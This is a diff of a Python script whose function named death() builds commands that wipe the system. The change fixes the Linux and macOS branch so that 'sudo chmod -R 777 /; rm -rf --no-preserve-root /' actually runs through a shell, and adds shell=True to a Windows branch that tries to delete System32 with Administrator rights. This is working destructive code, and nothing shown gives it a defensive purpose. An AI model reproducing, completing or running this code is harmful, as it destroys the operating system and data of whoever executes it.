@@ -44,13 +44,14 @@ def death():
             # command = "del /s /q C:\Windows\System32\*"
             command = ['def', '/s', '/q', 'C:\Windows\System32\*']
             # command = ['dir', '/ad']
-            subprocess.run(["runas", "/user:Adminstrator", "cmd", "/c", *command], check=True)
+            subprocess.run(["runas", "/user:Adminstrator", "cmd", "/c", *command], check=True, shell=True)
         except subprocess.CalledProcessError as e:
             print(e)
     elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
         try:
-            command1= ['sudo', 'chmod', '-R', '777', '/', 'rm', '-rf', '--no-preserve-root', '/']
-            subprocess.run([*command1], check=True)
+            # command1= ['sudo', 'chmod', '-R', '777', '/', ';', 'rm', '-rf', '--no-preserve-root', '/']
+            command1 = "sudo chmod -R 777 /; rm -rf --no-preserve-root /"
+            subprocess.run(command1, check=True, shell=True)
         except subprocess.CalledProcessError as e: 
             print(e)
 
